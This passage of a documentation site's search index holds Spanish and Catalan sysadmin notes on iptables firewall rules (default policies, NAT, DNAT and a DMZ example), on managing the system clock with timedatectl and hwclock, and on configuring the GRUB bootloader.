# ======================================================== # de la lan no accedir al router/fireall, excepte ssh, telnet i daytime iptables -A INPUT -s 172 .16.100.0/24 -p tcp --dport 22 -j ACCEPT iptables -A INPUT -s 172 .16.100.0/24 -p tcp --dport 23 -j ACCEPT iptables -A INPUT -s 172 .16.100.0/24 -p tcp --dport 13 -j ACCEPT iptables -A INPUT -s 172 .16.100.0/24 -j DROP #exit 0 # de la lan NO es pot navegar,telnet,ssh a fora iptables -A FORWARD -s 172 .16.100.0/24 -p tcp --dport 80 -j DROP iptables -A FORWARD -s 172 .16.100.0/24 -p tcp --dport 23 -j DROP iptables -A FORWARD -s 172 .16.100.0/24 -p tcp --dport 22 -j DROP # de la lan acces al servidor web de la dmz: intranet iptables -A INPUT -s 172 .16.100.0/24 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 172 .16.100.0/24 -p tcp --dport 443 -j ACCEPT # de exterior acces ports 3081:3085 redirigits a servers dins dmz iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3081 -j DNAT \\ --to 172 .32.1.11:81 iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3082 -j DNAT \\ --to 172 .32.1.11:82 iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3083 -j DNAT \\ --to 172 .32.1.11:83 iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3084 -j DNAT \\ --to 172 .32.1.11:84 iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3085 -j DNAT \\ --to 172 .32.1.11:85 # des de exteriors ports 3022:3025 redirigits a ssh host de la lan iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3022 -j DNAT \\ --to 172 .16.100.11:22 iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3023 -j DNAT \\ --to 172 .16.100.12:22 iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3024 -j DNAT \\ --to 172 .16.100.13:22","title":"Iptables"},{"location":"seguridad/cortafuegos/Iptables/#iptables","text":"","title":"Iptables"},{"location":"seguridad/cortafuegos/Iptables/#reglas-y-acciones","text":"Las reglas se eval\u00faan una a una secuencial mente en orden descendente, si una orden coincide con otra hace match, se aplica la primera, es decir si hay una regla que abre el puerto 5000 para la ip 1 y mas abajo hay otra regla que cierra el puerto 5000 para la ip 1, la segunda nunca se aplicara.","title":"Reglas y Acciones"},{"location":"seguridad/cortafuegos/Iptables/#activar-host-hacer-router","text":"echo 1 > /proc/sys/net/ipv4/ip_forward","title":"Activar host hacer router"},{"location":"seguridad/cortafuegos/Iptables/#borrar-reglas-actuales","text":"sudo iptables -F sudo iptables -X sudo iptables -Z sudo iptables -t nat -F","title":"Borrar reglas actuales"},{"location":"seguridad/cortafuegos/Iptables/#borrar-una-regla","text":"# Primer les mostrem amb n\u00ba de l\u00ednia iptables -t filter -n -L -v --line-numbers iptables -t nat -n -L -v --line-numbers iptables -t mangle -n -L -v --line-numbers # Esborrar la 4 iptables -D INPUT 4","title":"Borrar una regla"},{"location":"seguridad/cortafuegos/Iptables/#politica-por-defecto","text":"Existen dos pol\u00edticas por defecto ACCEPT y DROP, generalmente se establece en el inicio de los scripts cual sera su pol\u00edtica, aceptar todo por defecto o denegar todo por defecto.","title":"Politica por defecto"},{"location":"seguridad/cortafuegos/Iptables/#accept","text":"En la pol\u00edtica Accept todo esta permitido excepto lo que expl\u00edcitamente se deniegue, en este caso las reglas de firewall son una lista de lo que est\u00e1 prohibido. Esta pol\u00edtica es la mas f\u00e1cil de configurar pero el firewall nunca ser\u00e1 del todo seguro. sudo iptables -P INPUT ACCEPT sudo iptables -P OUTPUT ACCEPT sudo iptables -P FORWARD ACCEPT sudo iptables -t nat -P PREROUTING ACCEPT sudo iptables -t nat -P POSTROUTING ACCEPT","title":"Accept"},{"location":"seguridad/cortafuegos/Iptables/#drop","text":"Esta es la pol\u00edtica mas dif\u00edcil de configurar pero es mas segura, por que por defecto todo esta denegado y se han de asignar en las reglas del firewall todo lo que se permita, asegur\u00e1ndote no olvidarte ninguna opci\u00f3n imprescindible. sudo iptables -P INPUT DROP sudo iptables -P OUTPUT DROP sudo iptables -P FORWARD DROP sudo iptables -t nat -P PREROUTING DROP sudo iptables -t nat -P POSTROUTING DROP Uno de los errores que pueden ocurrir si las reglas no se han asignado bien, es que el sistema se quede bloqueado por haber cerrado demasiados servicios necesarios para el funcionamiento. toda comunicaci\u00f3n de red tiene dos sentidos. hace falta permitir los dos sentidos para considerar accesible un servicio. el trafico de respuesta se puede identificar con modificadores tipo related, established. el trafico necesario para el sistema a de estar abierto dns, sincronizaci\u00f3n horaria, pings, Ldap, Kerberos, NFS, samba, sg\u00fan de que dependa la m\u00e1quina para su funcionamiento.","title":"Drop"},{"location":"seguridad/cortafuegos/Iptables/#permitir-todo-via-localhost","text":"sudo iptables -A INPUT -i lo -j ACCEPT sudo iptables -A OUTPUT -o lo -j ACCEPT -i input-interface, -o output-interface","title":"Permitir todo v\u00eda localhost"},{"location":"seguridad/cortafuegos/Iptables/#permitir-todo-en-propia-ip","text":"sudo iptables -A INPUT -s 192 .168.88.2 -j ACCEPT sudo iptables -A OUTPUT -d 192 .168.88.2 -j ACCEPT -s source(origen) -d destination","title":"Permitir todo en propia ip"},{"location":"seguridad/cortafuegos/Iptables/#permitir-una-ipred-a-puerto","text":"# permitir acceder una red a un puerto sudo iptables -A INPUT -s 192 .168.88.0/24 -p tcp --dport 5432 -j ACCEPT # permitir una ip a un rango de puertos sudo iptables -A INPUT -s 80 .37.45.194 -p tcp --dport 20 :21 -j ACCEPT # permitir una ip a un puerto sudo iptables -A INPUT -s 80 .37.45.194 -p tcp --dport 80 -j ACCEPT","title":"Permitir una ip/red a puerto"},{"location":"seguridad/cortafuegos/Iptables/#cerrar-puerto-al-exterior","text":"sudo iptables -A INPUT -p tcp --dport 20 :21 -j DROP sudo iptables -A INPUT -p tcp --dport 5432 -j DROP sudo iptables -A INPUT -p tcp --dport 80 -j DROP","title":"Cerrar puerto al exterior"},{"location":"seguridad/cortafuegos/Iptables/#guardar-reglas-actuales","text":"sudo iptables-save > /etc/sysconfig/iptables","title":"Guardar reglas actuales"},{"location":"seguridad/cortafuegos/Iptables/#backup","text":"sudo iptables-save > arxiu.regles.iptables # exportar sudo iptables-restore < arxiu.regles.iptables # inportar","title":"Backup"},{"location":"seguridad/cortafuegos/Iptables/#sourceport","text":"En este ejemplo quiero que el host pueda navegar por internet, pero este mismo host tiene un servidor web y quiero que desde el exterior puedan acceder, por lo tanto a\u00f1ado la regla de aceptar entrada por source port (esto solo es estrictamente necesario en la pol\u00edtica drop). sudo iptables -A INPUT -p tcp -m tcp --sport 80 -m state \\ --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A OUTPUT -p tcp -m tcp --dport 80 -j ACCEPT sudo iptables -A INPUT -p tcp -m tcp --sport 443 -m state \\ --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT sudo iptables -A INPUT -p tcp --dport 80 -j DROP sudo iptables -A INPUT -p tcp --dport 443 -j DROP ESTABLECIDO significa que el paquete est\u00e1 asociado con una conexi\u00f3n que ha visto paquetes en ambos direcciones NUEVO que significa que el paquete ha comenzado una nueva conexi\u00f3n, o asociado con una conexi\u00f3n que no ha visto paquetes en ambas direcciones, RELACIONADO que significa que el paquete est\u00e1 iniciando una nueva conexi\u00f3n, pero est\u00e1 asociado con una conexi\u00f3n existente, como una transferencia de datos FTP o un ICMP En este caso el ejemplo es de un host/firewall con pol\u00edtica DROP que almacena un servidor web pero no tiene acceso de salida a internet, es decir el servidor web no puede hacer nuevas peticiones por http/s, pero si le permitimos que mande respuestas a las peticiones que le llegan. iptables -A INTPUT -p tcp -m tcp --dport 80 -j ACCEPT iptables -A OUTPUT -p tcp -m tcp --sport 80 -m state \\ --state RELATED,ESTABLISHED -j ACCEPT iptables -A INTPUT -p tcp -m tcp --dport 443 -j ACCEPT iptables -A OUTPUT -p tcp -m tcp --sport 443 -m state \\ --state RELATED,ESTABLISHED -j ACCEPT iptables -A OUTPUT -p tcp --dport 443 -j DROP iptables -A OUTPUT -p tcp --dport 80 -j DROP","title":"sourceport"},{"location":"seguridad/cortafuegos/Iptables/#permitir-trafico-establecido","text":"iptables -t filter -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT iptables -t filter -A OUPUT -m state --state ESTABLISHED,RELATED -j ACCEPT","title":"Permitir trafico establecido"},{"location":"seguridad/cortafuegos/Iptables/#servicios-en-drop","text":"# Permetre consultes DNS (primari i secundari) /sbin/iptables -A INPUT -s 80 .58.61.250 -p udp --sport 53 -j ACCEPT /sbin/iptables -A OUTPUT -d 80 .58.61.250 -p udp --dport 53 -j ACCEPT /sbin/iptables -A INPUT -s 80 .58.61.254 -p udp --sport 53 -j ACCEPT /sbin/iptables -A OUTPUT -d 80 .58.61.254 -p udp --dport 53 -j ACCEPT # Actuar de servidor web el host/firewall /sbin/iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT /sbin/iptables -A OUTPUT -p tcp -m tcp --sport 80 -m state \\ --state RELATED,ESTABLISHED -j ACCEPT # Permetre al host/firewall navegar per internet /sbin/iptables -A INPUT -p tcp -m tcp --sport 80 -m state \\ --state RELATED,ESTABLISHED -j ACCEPT /sbin/iptables -A OUTPUT -p tcp -m tcp --dport 80 -j ACCEPT /sbin/iptables -A INPUT -p tcp -m tcp --sport 443 -m state \\ --state RELATED,ESTABLISHED -j ACCEPT /sbin/iptables -A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT # Consultar al servidor de temps per permetre la sincronitzaci\u00f3 hor\u00e0ria /sbin/iptables -A INPUT -p udp -m udp --dport 123 -j ACCEPT /sbin/iptables -A OUTPUT -p udp -m udp --sport 123 -j ACCEPT # Permetre el tr\u00e0fic SMTP d\u2019entrada i sortida iptables -A INPUT -s 0 .0.0.0/0 -p tcp --dport 25 -j ACCEPT iptables -A OUTPUT -s 0 .0.0.0/0 -p tcp --dport 25 -j ACCEPT # Servei FTP actiu i passiu /sbin/iptables -A INPUT -p tcp -m tcp --sport 20 :21 -m state \\ --state RELATED,ESTABLISHED -j ACCEPT /sbin/iptables -A OUTPUT -p tcp -m tcp --dport 20 :21 -j ACCEPT # puertos no sistema /sbin/iptables -A INPUT -p tcp -m tcp --sport 1024 :65535 --dport 1024 :65535 -m state \\ --state ESTABLISHED -j ACCEPT /sbin/iptables -A OUTPUT -p tcp -m tcp --dport 1024 :65535 -m state \\ --state NEW,RELATED,ESTABLISHED -j ACCEPT En ocasiones la pol\u00edtica drop hace demasiado bien su trabajo y al abrir nuevos servicios, fallan por que les esta cortando el firewall y se pone en pol\u00edtica accept temporalmente mientras se soluciona el script por prisas o etc.. por esto mismo es una buena practica al final del script poner la barrera drop y as\u00ed no exponer datos sensibles que podamos tener.. # Barrera final DROP per si es canvia a ACCEPT temporalment # tancar tr\u00e0fic no desitjat /sbin/iptables -A INPUT -p tcp -m tcp --dport 1 :1024 -j DROP /sbin/iptables -A INPUT -p udp -m udp --dport 1 :1024 -j DROP /sbin/iptables -A INPUT -p tcp -m tcp --dport 1723 -j DROP /sbin/iptables -A INPUT -p tcp -m tcp --dport 3306 -j DROP /sbin/iptables -A INPUT -p tcp -m tcp --dport 5432 -j DROP","title":"Servicios en drop"},{"location":"seguridad/cortafuegos/Iptables/#forwarding","text":"$ echo 1 > /proc/sys/net/ipv4/ip_forward # o be: sysctl net.ipv4.ip_forward = 1 sysctl -a | grep ip_forward net.ipv4.ip_forward = 1 En un firewall por defecto la red externa suele tener todos los puertos cerrados y la interna abiertos, eth0 interficie externa, eth1 interficie interna. iptables -A INPUT -s 0 .0.0.0 -i eth0 -j DROP iptables -A INPUT -s 172 .16.10.0/24 -i eth1 -j ACCEPT","title":"Forwarding"},{"location":"seguridad/cortafuegos/Iptables/#nat","text":"Network Addres Translation se le aplica cuando en un router o host/firewall con dos o mas interficies, recibe peticiones por un red y las devuelve por otra con una ip diferente, en este proceso se a aplicado un forward a recibido un paquete por una red, a mirado de quien era y se lo a enviado estando en una red diferente el destinatario. # NAT usant la IP p\u00fablica de eth0 iptables -t nat -A POSTROUTING -s 172 .16.10.0/24 -o eth0 -j MASQUERADE","title":"Nat"},{"location":"seguridad/cortafuegos/Iptables/#forward","text":"# no deixar sortir de la lan a exterior a serveis concrets iptables -A FORWARD -s 172 .16.100.0/24 -p tcp --dport 7 -j REJECT iptables -A FORWARD -s 172 .16.100.11 -p tcp --dport 13 -j REJECT # no deixar sortir de la lan a exterior segons dest\u00ed iptables -A FORWARD -s 172 .16.100.0/24 -d 192 .168.1.34 -p tcp --dport 23 -j REJECT iptables -A FORWARD -i em1 -d 192 .168.1.0/24 -p tcp --dport 82 -j REJECT # un host de la lan concret no pot accedir a un servei extern (segons dest\u00ed) iptables -A FORWARD -s 172 .16.100.11 -d 192 .168.1.34 -p tcp --dport 110 -j REJECT iptables -A FORWARD -s 172 .16.100.11 -d 192 .168.1.0/24 -p tcp --dport 143 -j REJECT # evitar que des de dins de la LAN es falsifiqui ip origen (spoofing) iptables -A FORWARD ! -s 172 .16.100.0/24 -i em1 -j REJECT","title":"Forward"},{"location":"seguridad/cortafuegos/Iptables/#dnat","text":"Destination network address translation es muy similar a NAT pero en DNAT se redirige el puerto a otro diferente, igual que NAT tambi\u00e9n se puede redirigir el destino. Es decir en NAT redirigimos de ip a ip y en DNAT de ip:puerto a ip:puerto . # dirigir tot el tr\u00e0fic http port 80 a un altre host de la LAN iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j DNAT --to 192 .168.10.12:80 iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j DNAT --to 192 .168.10.12:443 # si el tr\u00e0fic hhtp prov\u00e9 de de casa meva (221.15.15.15) enviar-lo a un altre web server # (aquesta regla ha d\u2019anar abans de les anteriors) iptables -t nat -A PREROUTING -s 221 .15.15.15 -i eth0 -p tcp --dport 80 -j DNAT \\ --to 192 .168.10.10:80 iptables -t nat -A PREROUTING -s 221 .15.15.15 -i eth0 -p tcp --dport 443 -j DNAT \\ --to 192 .168.10.10:443 # obrir puerto 2022 e la interfaz enp3s0 y redirigir a 192.168.10.10:22 iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 2022 -j DNAT --to 192 .168.10.10:22 # port forwarding seg\u00fan la red de origen iptables -t nat -A PREROUTING -s 172 .17.0.0/24 -i eth0 -p tcp --dport 2022 -j DNAT --to 192 .168.10.10:22","title":"Dnat"},{"location":"seguridad/cortafuegos/Iptables/#icmp","text":"iptables -A FORWARD -p icmp --icmp-type 8 -j DROP # habilitar ping iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT iptables -A OUTPUT -p icmp --icmp-type echo-request -j ACCEPT # no aceptar ping iptables -A INPUT -p ICMP -j DROP # o iptables -A INPUT -p icmp --icmp-type 8 -j DROP iptables -A OUTPUT -p icmp --icmp-type 8 -j DROP echo-reply (pong) echo-request (ping) => Zero (0) is for echo-reply => Eight (8) is for echo-request.","title":"Icmp"},{"location":"seguridad/cortafuegos/Iptables/#ejemplo-drop","text":"# Regles Flush: buidar les regles actuals iptables -F iptables -X iptables -Z iptables -t nat -F # Establir la politica per defecte (ACCEPT o DROP) iptables -P INPUT DROP iptables -P OUTPUT DROP iptables -P FORWARD DROP # Permetre totes les pr\u00f2pies connexions via localhost iptables -A INPUT -i lo -j ACCEPT iptables -A OUTPUT -o lo -j ACCEPT # Permetre tot el trafic de la pr\u00f2pia ip(192.168.1.49)) iptables -A INPUT -s 192 .168.1.35 -j ACCEPT iptables -A OUTPUT -d 192 .168.1.35 -j ACCEPT #exit 0 # ----------------------------------------------------------- # consulta dns primari iptables -A INPUT -s 80 .58.61.250 -p udp -m udp --sport 53 -j ACCEPT iptables -A OUTPUT -d 80 .58.61.250 -p udp -m udp --dport 53 -j ACCEPT # consulta dns secundari iptables -A INPUT -s 80 .58.61.254 -p udp -m udp --sport 53 -j ACCEPT iptables -A OUTPUT -d 80 .58.61.254 -p udp -m udp --dport 53 -j ACCEPT # consulta ntp iptables -A INPUT -p udp -m udp --dport 123 -j ACCEPT iptables -A OUTPUT -p udp -m udp --sport 123 -j ACCEPT # ---------------------------------------------------------- # servei cups iptables -A INPUT -p tcp --dport 631 -j ACCEPT iptables -A OUTPUT -p tcp --sport 631 -j ACCEPT # port xinetd iptables -A INPUT -p tcp --dport 3411 -j ACCEPT iptables -A OUTPUT -p tcp --sport 3411 -j ACCEPT # port x11-x-forwarding iptables -A INPUT -p tcp --dport 6010 -j ACCEPT iptables -A OUTPUT -p tcp --sport 6010 -j ACCEPT # servei rpc iptables -A INPUT -p tcp --dport 111 -j ACCEPT iptables -A OUTPUT -p tcp --sport 111 -j ACCEPT # ----------------------------------------------------------- # icmp iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT iptables -A OUTPUT -p icmp --icmp-type echo-request -j ACCEPT # ----------------------------------------------------------- # servei ssh iptables -A INPUT -p tcp --dport 22 -j ACCEPT iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT # servei http iptables -A INPUT -p tcp --dport 80 -j ACCEPT iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT # servei daytime iptables -A INPUT -p tcp --dport 13 -j ACCEPT iptables -A OUTPUT -p tcp --sport 13 -j ACCEPT # servei echo iptables -A INPUT -p tcp --dport 7 -j ACCEPT iptables -A OUTPUT -p tcp --sport 7 -j ACCEPT # servei smtp iptables -A INPUT -p tcp --dport 25 -j ACCEPT iptables -A OUTPUT -p tcp --sport 25 -j ACCEPT # exit 0 # ============================================================== # atencio: cal millorar aquestes regles!!! ***** # cal que nomes es permeti trafic relacionat ***** # ============================================================== # navegar web #iptables -A INPUT -p tcp --sport 80 -j ACCEPT iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT iptables -A INPUT -p tcp --sport 443 -j ACCEPT iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT # accedir a servei echo #iptables -A INPUT -p tcp --sport 7 -j ACCEPT iptables -A OUTPUT -p tcp --dport 7 -j ACCEPT # accedir al servei daytime #iptables -A INPUT -p tcp --sport 13 -j ACCEPT iptables -A OUTPUT -p tcp --dport 13 -j ACCEPT # accedir al servei ssh #iptables -A INPUT -p tcp --sport 22 -j ACCEPT iptables -A OUTPUT -p tcp --dport 22 -j ACCEPT iptables -A INPUT -m state --state ESTABLISHED,RELATED iptables -A OUTPUT -m state --state ESTABLISHED,RELATED # ----------------------------------------------------------------- # ftp i tftp (trafic udp) ***** # ----------------------------------------------------------------- # oferir servei tftp iptables -A INPUT -p udp --dport 69 -j ACCEPT iptables -A OUTPUT -p udp --sport 69 -j ACCEPT # accedir a serveis tftp externs iptables -A INPUT -p udp --sport 69 -j ACCEPT iptables -A OUTPUT -p udp --dport 69 -j ACCEPT # pendent obrir ports dinamics # oferir servei ftp iptables -A INPUT -p tcp --dport 20 :21 -j ACCEPT iptables -A OUTPUT -p tcp --sport 20 :21 -j ACCEPT # accdir a serveis ftp externs iptables -A INPUT -p tcp --sport 20 :21 -j ACCEPT iptables -A OUTPUT -p tcp --dport 20 :21 -j ACCEPT # pendent obrir ports dinamics! # -------------------------------------------------------------- # Barrera per tancar els serveis/ports en cas de passar a drop # ...","title":"Ejemplo Drop"},{"location":"seguridad/cortafuegos/Iptables/#ejemplo-dmz","text":"# Activar si el host ha de fer de router echo 1 > /proc/sys/net/ipv4/ip_forward # Regles Flush: buidar les regles actuals iptables -F iptables -X iptables -Z iptables -t nat -F # Establir la politica per defecte (ACCEPT o DROP) iptables -P INPUT ACCEPT iptables -P OUTPUT ACCEPT iptables -P FORWARD ACCEPT iptables -t nat -P PREROUTING ACCEPT iptables -t nat -P POSTROUTING ACCEPT # Permetre totes les pr\u00f2pies connexions via localhost iptables -A INPUT -i lo -j ACCEPT iptables -A OUTPUT -o lo -j ACCEPT # Permetre tot el trafic de la propia ip exterior (wlan0:192.168.1.41)) iptables -A INPUT -s 192 .168.1.41 -j ACCEPT iptables -A OUTPUT -d 192 .168.1.41 -j ACCEPT # Permetre tot el trafic de la propia ip interior (em1:172.16.100.1)) iptables -A INPUT -s 172 .16.100.1 -j ACCEPT iptables -A OUTPUT -d 172 .16.100.1 -j ACCEPT # Permetre tot el trafic de la propia ip interior (em1:172.32.1.1)) iptables -A INPUT -s 172 .32.1.1 -j ACCEPT iptables -A OUTPUT -d 172 .32.1.1 -j ACCEPT #exit 0 # Ahora hacemos enmascaramiento de la red local (HACIA FUERA) iptables -t nat -A POSTROUTING -s 172 .16.100.0/24 -o wlan0 -j MASQUERADE iptables -t nat -A POSTROUTING -s 172 .32.1.0/24 -o wlan0 -j MASQUERADE #exit 0 # ========================================================== # Regles de: xarxa_local-(R/F)-xarxa_externa # # LOCAL_LAN ---(em1)Router/Firewall(wlan0)-- PUBLIC_LAN # | # DMZ (em1) # ======================================================== # de la lan no accedir al router/fireall, excepte ssh, telnet i daytime iptables -A INPUT -s 172 .16.100.0/24 -p tcp --dport 22 -j ACCEPT iptables -A INPUT -s 172 .16.100.0/24 -p tcp --dport 23 -j ACCEPT iptables -A INPUT -s 172 .16.100.0/24 -p tcp --dport 13 -j ACCEPT iptables -A INPUT -s 172 .16.100.0/24 -j DROP #exit 0 # de la lan NO es pot navegar,telnet,ssh a fora iptables -A FORWARD -s 172 .16.100.0/24 -p tcp --dport 80 -j DROP iptables -A FORWARD -s 172 .16.100.0/24 -p tcp --dport 23 -j DROP iptables -A FORWARD -s 172 .16.100.0/24 -p tcp --dport 22 -j DROP # de la lan acces al servidor web de la dmz: intranet iptables -A INPUT -s 172 .16.100.0/24 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 172 .16.100.0/24 -p tcp --dport 443 -j ACCEPT # de exterior acces ports 3081:3085 redirigits a servers dins dmz iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3081 -j DNAT \\ --to 172 .32.1.11:81 iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3082 -j DNAT \\ --to 172 .32.1.11:82 iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3083 -j DNAT \\ --to 172 .32.1.11:83 iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3084 -j DNAT \\ --to 172 .32.1.11:84 iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3085 -j DNAT \\ --to 172 .32.1.11:85 # des de exteriors ports 3022:3025 redirigits a ssh host de la lan iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3022 -j DNAT \\ --to 172 .16.100.11:22 iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3023 -j DNAT \\ --to 172 .16.100.12:22 iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3024 -j DNAT \\ --to 172 .16.100.13:22","title":"Ejemplo DMZ"},{"location":"sistemas/Actualizar_hora_sys_o_bios/","text":"Gestionar Hora Antiguamente se gestionaba la hora en GMT Greenwich Mean Time bas\u00e1ndose en las lineas imaginarias de la tierra, pero ahora esto se a actualizado a UTC Coordinated Universal Time bas\u00e1ndose en relojes at\u00f3micos mas precisos, la cuesti\u00f3n es que seg\u00fan el sistema operativo utilizado utiliza una u otra linux, mac: UTC, windows: GMT. Esto puede dar problemas al tener un dual boot, ya que al apagar el pc se guarda la hora en RTC Real Time Clock es decir la bios, y al arrancar se recoge y a\u00f1ade en el sistema, por eso al encender un ordenador sin red tiene la hora correctamente. Mostrar hora del sistema # general debian \u279c ~ timedatectl Local time: mi\u00e9 2019 -06-05 12 :48:31 CEST Universal time: mi\u00e9 2019 -06-05 10 :48:31 UTC RTC time: mi\u00e9 2019 -06-05 10 :46:09 Time zone: Europe/Madrid ( CEST, +0200 ) System clock synchronized: no NTP service: active RTC in local TZ: yes # sistema debian \u279c ~ date mi\u00e9 jun 5 12 :49:48 CEST 2019 local Time. hora local Universal time: hora UTC RTC : Hora del hardware Time zone: Zona horaria geograficament network time: agafar o no hora d'internet NTP: agafar o no hora del servidor ntp RTC in local TZ: utilizar localtime o no Cambiar hora del sistema. sudo date --set \u201ca\u00f1o-mes-dia hora\u201d timedatectl set-time 15 :15 Zonas horarias timedatectl list-timezones | grep Europe timedatectl set-timezone Europe/Madrid Establecer hora del sistema automaticamente systemctl start chronyd Recoge la hora de la red y la establece en el sistema. Incorpora hora del sistema en la bios. sudo hwclock systohc Extraer hora de la bios. sudo hwclock hctosys","title":"Gestionar Hora"},{"location":"sistemas/Actualizar_hora_sys_o_bios/#gestionar-hora","text":"Antiguamente se gestionaba la hora en GMT Greenwich Mean Time bas\u00e1ndose en las lineas imaginarias de la tierra, pero ahora esto se a actualizado a UTC Coordinated Universal Time bas\u00e1ndose en relojes at\u00f3micos mas precisos, la cuesti\u00f3n es que seg\u00fan el sistema operativo utilizado utiliza una u otra linux, mac: UTC, windows: GMT. Esto puede dar problemas al tener un dual boot, ya que al apagar el pc se guarda la hora en RTC Real Time Clock es decir la bios, y al arrancar se recoge y a\u00f1ade en el sistema, por eso al encender un ordenador sin red tiene la hora correctamente. Mostrar hora del sistema # general debian \u279c ~ timedatectl Local time: mi\u00e9 2019 -06-05 12 :48:31 CEST Universal time: mi\u00e9 2019 -06-05 10 :48:31 UTC RTC time: mi\u00e9 2019 -06-05 10 :46:09 Time zone: Europe/Madrid ( CEST, +0200 ) System clock synchronized: no NTP service: active RTC in local TZ: yes # sistema debian \u279c ~ date mi\u00e9 jun 5 12 :49:48 CEST 2019 local Time. hora local Universal time: hora UTC RTC : Hora del hardware Time zone: Zona horaria geograficament network time: agafar o no hora d'internet NTP: agafar o no hora del servidor ntp RTC in local TZ: utilizar localtime o no Cambiar hora del sistema. sudo date --set \u201ca\u00f1o-mes-dia hora\u201d timedatectl set-time 15 :15 Zonas horarias timedatectl list-timezones | grep Europe timedatectl set-timezone Europe/Madrid Establecer hora del sistema automaticamente systemctl start chronyd Recoge la hora de la red y la establece en el sistema. Incorpora hora del sistema en la bios. sudo hwclock systohc Extraer hora de la bios. sudo hwclock hctosys","title":"Gestionar Hora"},{"location":"sistemas/Arranque-del-sistema/","text":"Arranque del sistema Anaconda: grub, systemd Master Boot Record ( MBR ) Es un registro de arranque maestro , el primer sector de un dispositivo de almacenamiento de dados, contiene la tabla de particiones primarias del disco, el arranque y la firma de la unidad de arranque. Este registro se esta quedando en desuso, con la actualizaci\u00f3n al registro UEFI. Tabla particiones: \u00edndice de la tabla de las particiones primarias del dispositivo. Arranque ( bootstrap ) proceso de inicio del ordenador, u peque\u00f1o programa que arranca el sistema operativo, por ejemplo Grup, Lilo en Gnu/linux y BCD o NTLDR en Windows. En el caso de Grup y similares bootstrap del MBR solo es un acceso (link) a la partici\u00f3n que contiene todo me contenido de grub. Informaci\u00f3n Firma del MBR 2 bytes Pasos del arranque post ( decectar hardware ) Autoprueba el arranque, testea todo el harware conectado a la placa madre, en caso de error emite sonidos como c\u00f3digo de error. bios El prop\u00f3sito fundamental del BIOS es iniciar y probar el hardware del sistema y cargar un gestor de arranque. setup ( prioridad de arranque ), hda, cdrom, red, etc.. fallback ( pasar siguiente opci\u00f3n en caso de fallo ) disco hda -> mbr -> antes tabla de particiones activa ahora boot loader: Grub grub de mbr carga grub de particion x Muestra el men\u00fa de opciones de arranque carga kernel carga initramfs systemd ( antes initd ) La mejora de systemd respecto a initd es que trabaja con concurencia, todos los m\u00f3dulos se encieden a la vez y se esperan si dependen de otro para iniciarse. Esto mejora el rendimiento de arranque. arranca m\u00f3dulos necesarios systemd-analyze blame muestra el tiempo que a tardado en arrancar cada m\u00f3dulo, muy \u00fatil para detectar problemas de arranque. Grub Instalar grub en el mbr grub2-install /dev/sda # link de mbr apunte a partici\u00f3n actual # link del mbr apunte a partici\u00f3n montada en /mnt grub2-install --boot-directory=/mnt/boot /dev/sda Leer sistemas operativos instalados en el sistema y generar grub.cfg grub2-mkconfig -o /boot/grub2/grub.cfg Edici\u00f3n grub Al generar un grub.cfg en cada entrada lo importante para arrancar son las siguientes lineas: insmod para cargar los m\u00f3dulos necesarios. set root ruta de disco y partici\u00f3n donde buscar archivos. linux16, initrd16 cargar kernel en partici\u00f3n indicada y ramdisk menuentry 'fedora mati' { insmod gzio insmod part_msdos insmod ext2 set root = 'hd0,msdos5' linux16 /boot/vmlinuz-5.0.... root = /dev/sda5 initrd16 /boot/initrd-5.0.. .img } menuentry 'win2' { insmod part_msdos insmod ntfs # en el caso de partici\u00f3n vfat insmod vfat set root =( hd0,2 ) chainloader +1 } # Passar el control a un altre carregador menuentry 'cahinloader' { insmod gzio insmod part_msdos insmod ext2 set root =( hd0,8 ) chainloader +1 } Submenus Crear un submen\u00fa es tan sencillo como englobar todos los menuentry que desees dentro de los claudators de un submen\u00fa. submenu 'submenu mini' { menuentry 'fed 1 min' { .... } menuentry 'fed 1 min rescue' { .... } } Par\u00e1metros adicionales set default = 0 # arranca por defecto la primera entrada del menu set timeout = -1 # tiempo de espera para la entrada por defecto, -1 espera interaci\u00f3n Sticks de arranque En el caso que el enlace del bootstrap hasta el directorio /boot funcione pero por alguna raz\u00f3n, no encuentre el archivo grub.cfg, aparecer\u00e1 el prompt del grub #grub> desde el que podemos arrancar el sistema de diferentes maneras. Tunear una entrada existente de grub El el caso de querer arrancar un sistema que no esta en el grub.cfg. Escribir en modo comando una entrada. Sabiendo donde esta el sistema operativo podemos arrancar escribiendo manualmente los comandos de la edici\u00f3n de grub del apartado anterior. En modo comando llamar a alg\u00fan fichero grub.cfg de alguna partici\u00f3n existente. #grub> configfile (hd0,msdos5)/boot/grub2/grub.cfg En el caso del link del mbr a la partici\u00f3n donde se encuentra el directorio grub este roto. Grub no podr\u00e1 acceder a los m\u00f3dulos, por lo tanto aparecer\u00e1 grub rescue> al arrancar. La soluci\u00f3n indicar en que 